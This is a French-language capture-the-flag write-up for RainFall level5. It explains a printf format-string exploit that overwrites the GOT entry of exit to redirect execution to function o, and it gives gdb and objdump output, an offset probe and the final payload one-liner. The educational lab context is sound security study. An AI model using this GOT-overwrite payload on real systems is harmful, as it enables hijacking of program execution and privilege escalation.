# Solution : 

```
(python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")'; cat) | ./level5
```

## Explication du level

Ici le niveau est le meme que les precedent sauf que au lieu d'utiliser un printf format exploit, pour ecrire dans une variable ou autre on va directment overwrite l'adresse d'une fonction de la libc , "exit" son adresse se situe dans la global offset table (GOT).

------------------------------------------------------------------------------------------------
Adresse de o :

level5@RainFall:~$ gdb ./level5 
(gdb) p &o
$1 = (<text variable, no debug info> *) 0x80484a4 <o>

------------------------------------------------------------------------------------------------

Adresse de exit dans la Got (global offset table) :

Technique 1 : 
```
level5@RainFall:~$ objdump -R level5 

level5:     file format elf32-i386
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
Technique 2 :
```
level5@RainFall:~$ gdb ./level5

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048390  _exit
0x08048390  _exit@plt
0x080483d0  exit
0x080483d0  exit@plt

(gdb) x/i 0x080483d0
   0x80483d0 <exit@plt>:	jmp    *0x8049838
```
------------------------------------------------------------------------------------------------
On recupere l'offset :
```
level5@RainFall:~$ python -c 'print("AAAA" + " %p " * 8)'| ./level5 
AAAA 0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141  0x20702520  0x20702520  0x20702520  0x20702520
```
On converti l'adresse o en decimal : 

En hexadecimal  : 0x80484a4
En decimal      : 134513828

------------------------------------------------------------------------------------------------

## Payload
On cree notre payload :

Offset : 4
Adresse de o : 0x80484a4 || 134513828
Adresse de exit dans la GOT : 0x8049838

[Adress de exit dans la got] + [Padding pour overwrite a l'adresse de o] + [Argument que l'on veut overwrite]
```
(python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")'; cat) | ./level5
```
On retire 4 a l'adresse de o, pour que adresse de exit + 134513824 = adresse de o
